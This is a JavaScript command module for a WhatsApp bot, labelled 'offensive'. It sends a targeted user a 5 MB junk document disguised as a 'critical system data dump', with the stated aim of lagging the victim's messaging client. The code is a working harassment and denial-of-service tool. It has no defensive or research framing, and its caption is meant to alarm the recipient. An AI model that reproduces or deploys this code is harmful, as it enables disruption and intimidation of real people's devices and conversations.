const { log } = require('../utils/logger');

module.exports = {
    name: 'storageclog',
    description: '💾 Storage-Clog: Sends a simulated massive document to cause client-side rendering lag.',
    category: 'offensive',
    isAdmin: true,
    isOwner: true,
    async execute({ sock, chatId, message, args, bot }) {
        try {
            const target = message.message?.extendedTextMessage?.contextInfo?.participant ||
                (args[0] ? args[0].replace('@', '') + '@s.whatsapp.net' : chatId);

            await sock.sendMessage(chatId, { text: `💾 *INITIATION DU STORAGE-CLOG* sur @${target.split('@')[0]}...`, mentions: [target] });

            // Sending a large white-space document payload
            const payload = Buffer.alloc(1024 * 1024 * 5, 'ABYSSFLOW_CORE_NULL_BYTES '); // 5MB of text-ish data

            await sock.sendMessage(target, {
                document: payload,
                mimetype: 'application/octet-stream',
                fileName: 'ABYSS_CORE_SYSTEM_DUMP_v2.8.bin',
                caption: '⚠️ *CRITICAL:* System data dump captured. Analyzing infrastructure...'
            });

            if (target !== chatId) {
                await sock.sendMessage(chatId, { text: `✅ *STORAGE-CLOG COMPLÉTÉ.* Le rendu client de la cible devrait être impacté.`, mentions: [target] });
            }

        } catch (error) {
            log.error('Error in STORAGECLOG:', error);
        }
    }
};
